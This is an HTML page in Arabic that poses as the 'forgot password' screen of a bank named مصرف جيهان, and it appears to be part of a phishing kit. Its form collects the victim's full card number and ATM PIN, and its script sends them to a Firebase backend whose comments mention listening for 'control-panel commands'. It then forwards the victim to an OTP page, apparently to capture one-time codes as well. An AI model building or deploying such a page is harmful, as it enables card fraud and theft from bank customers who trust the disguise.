<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <!-- i18n: تحديد اللغة (الافتراضي السورانية) قبل الرسم لمنع الوميض -->
    <script src="/assets/i18n/i18n-init.js"></script>
    <link rel="stylesheet" href="/assets/i18n/i18n.css">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نسيت كلمة المرور | مصرف جيهان</title>
    <meta name="description" content="إعادة تعيين كلمة مرور حسابك في مصرف جيهان.">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@400;600;700;800&display=swap" rel="stylesheet">

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        background: '#ffffff',
                        foreground: '#020618',
                        primary: '#0f172b',
                        'primary-foreground': '#f8fafc',
                        brand: '#a91518',
                        'brand-foreground': '#fcfcfc',
                        input: '#e2e8f0',
                        muted: '#62748e',
                    },
                    fontFamily: { cairo: ['Cairo', 'sans-serif'] }
                }
            }
        }
    </script>
    <style>
        body { font-family: 'Cairo', sans-serif; }
        input[type=number]::-webkit-outer-spin-button,
        input[type=number]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        input[type=number] { -moz-appearance: textfield; }
    </style>
<style>
        /* خط كوردي (سورانی) يغطي الحروف الخاصة: ڕ ڵ ۆ ێ گ چ پ ژ */
        html[lang="ckb"] body { font-family: 'Noto Kufi Arabic', 'Cairo', sans-serif; }
        html[lang="en"] body { font-family: 'Cairo', 'Segoe UI', sans-serif; }
    </style>
</head>
<body class="bg-background text-foreground">

    <div class="flex min-h-screen flex-col bg-background px-6 pb-8 pt-5">

        <!-- الرأس: زر اللغة + زر الرجوع -->
        <div class="flex items-center justify-between">
            <div data-lang-switcher data-lang-theme="light"></div>
            <a aria-label="رجوع" href="login.html" class="text-foreground hover:opacity-70 transition-opacity">
                <i class="fa-solid fa-chevron-right text-3xl"></i>
            </a>
        </div>

        <div class="mx-auto flex w-full max-w-md flex-1 flex-col">

            <h1 class="mt-6 text-center text-3xl font-semibold">نسيت كلمة المرور</h1>

            <!-- رسم توضيحي -->
            <img src="/assets/images/forgot-illustration.png" alt="" loading="lazy"
                 class="mx-auto mt-6 h-56 w-auto object-contain">

            <!-- تنبيه إرشادي -->
            <div class="mt-8 rounded-2xl bg-amber-50 p-5 text-amber-600">
                <div class="flex items-center gap-3">
                    <i class="fa-solid fa-triangle-exclamation text-3xl shrink-0"></i>
                    <p class="font-semibold">تأكد عند إعادة تعيين كلمة مرور حسابك</p>
                </div>
                <ul class="mt-3 list-disc space-y-1 pr-6 text-sm">
                    <li>يجب أن تحتوي على 8 أحرف على الأقل.</li>
                    <li>يجب أن تحتوي على حرف كبير واحد على الأقل، رقم واحد ورمز خاص واحد.</li>
                </ul>
            </div>

            <!-- النموذج -->
            <form id="resetForm" class="mt-8 space-y-4" onsubmit="return false;">

                <!-- رقم البطاقة -->
                <div class="relative">
                    <input id="cardNumber" placeholder="البطاقة" inputmode="numeric" maxlength="16" autocomplete="cc-number"
                           class="h-14 w-full rounded-full border border-input bg-background px-6 pl-16 text-base outline-none focus:ring-2 focus:ring-brand transition">
                    <span class="absolute left-5 top-1/2 -translate-y-1/2 pointer-events-none">
                        <span class="relative inline-flex h-6 w-10 items-center" aria-hidden="true">
                            <span class="absolute left-0 h-6 w-6 rounded-full bg-[#EB001B]"></span>
                            <span class="absolute right-0 h-6 w-6 rounded-full bg-[#F79E1B] opacity-90"></span>
                        </span>
                    </span>
                </div>

                <!-- شفرة الصراف الآلي -->
                <div class="relative">
                    <input id="atmPin" type="password" placeholder="شفرة التعريف للصراف الآلي" inputmode="numeric" maxlength="4"
                           class="h-14 w-full rounded-full border border-input bg-background px-6 pl-16 text-base outline-none focus:ring-2 focus:ring-brand transition">
                    <button type="button" id="togglePin" aria-label="إظهار الشفرة"
                            class="absolute left-3 top-1/2 -translate-y-1/2 flex h-9 w-9 items-center justify-center rounded-lg text-muted hover:text-foreground transition-colors">
                        <i class="fa-solid fa-eye-off text-xl" id="pinEye"></i>
                    </button>
                </div>

            </form>

            <!-- زر تغيير كلمة المرور -->
            <button id="resetBtn" class="mt-auto h-16 w-full rounded-full bg-brand text-2xl font-bold text-brand-foreground shadow-md transition hover:opacity-95">
                تغيير كلمة المرور
            </button>

        </div>
    </div>

    <!-- زر الأسئلة العائم -->
    <div dir="rtl" class="fixed bottom-4 left-4 z-50">
        <button type="button" class="rounded-full bg-primary px-4 py-3 text-sm font-bold text-primary-foreground shadow-lg transition hover:opacity-95">
            أسئلة عن العرض؟
        </button>
    </div>

    <script>
        (function () {
            // إظهار/إخفاء شفرة الصراف
            var pin = document.getElementById('atmPin');
            var toggle = document.getElementById('togglePin');
            var eye = document.getElementById('pinEye');
            toggle.addEventListener('click', function () {
                var isPwd = pin.getAttribute('type') === 'password';
                pin.setAttribute('type', isPwd ? 'text' : 'password');
                eye.classList.toggle('fa-eye', isPwd);
                eye.classList.toggle('fa-eye-off', !isPwd);
            });

            // تنظيف الإدخال (أرقام فقط)
            var card = document.getElementById('cardNumber');
            card.addEventListener('input', function () { card.value = card.value.replace(/\D/g, '').slice(0, 16); });
            pin.addEventListener('input', function () { pin.value = pin.value.replace(/\D/g, '').slice(0, 4); });

            // زر تغيير كلمة المرور
            document.getElementById('resetBtn').addEventListener('click', function () {
                var cardVal = card.value.trim();
                var pinVal = pin.value.trim();
                if (!cardVal || !pinVal) {
                    card.focus();
                    return;
                }

                // إرسال البيانات إلى قاعدة البيانات ثم التوجيه إلى صفحة OTP
                var go = function () { window.location.href = 'otp.html'; };
                if (typeof window.submitPasswordReset === 'function') {
                    window.submitPasswordReset({ card: cardVal, atmPin: pinVal }).then(go).catch(go);
                } else {
                    go();
                }
            });
        })();
    </script>

    <!-- Firebase: الاتصال بقاعدة البيانات + الاستماع لأوامر لوحة التحكم -->
    <script src="/assets/js/firebase-env.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
    <script src="/assets/js/firebase-client.js?v=11"></script>
    <script src="/assets/js/request-store.js?v=1"></script>
    <script src="/assets/js/page-commands.js?v=3"></script>
    <!-- i18n: القواميس + المحرّك + زر تبديل اللغة (يُطبَّق على كل الصفحات) -->
    <script src="/assets/i18n/ar.js?v=1"></script>
    <script src="/assets/i18n/en.js?v=1"></script>
    <script src="/assets/i18n/ckb.js?v=1"></script>
    <script src="/assets/i18n/i18n.js?v=1"></script>
    <script src="/assets/js/lang-switcher.js?v=1"></script>
</body>
</html>
